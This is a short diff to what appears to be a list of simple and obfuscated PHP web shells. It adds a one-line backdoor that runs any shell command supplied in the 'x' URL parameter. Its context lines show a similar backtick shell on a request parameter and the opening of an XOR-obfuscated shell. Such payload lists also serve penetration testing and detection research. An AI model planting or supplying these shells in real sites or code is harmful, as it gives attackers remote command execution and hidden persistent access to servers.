@@ -5,6 +5,9 @@ several list of simple and obfuscate PHP shell and uploader
 <?= `{$_REQUEST['_']}` ?>
 ```
 ```
+<?=`$_GET[x]`?>
+```
+```
 <?php
 $_="{";
 $_=($_^"<").($_^">;").($_^"/");
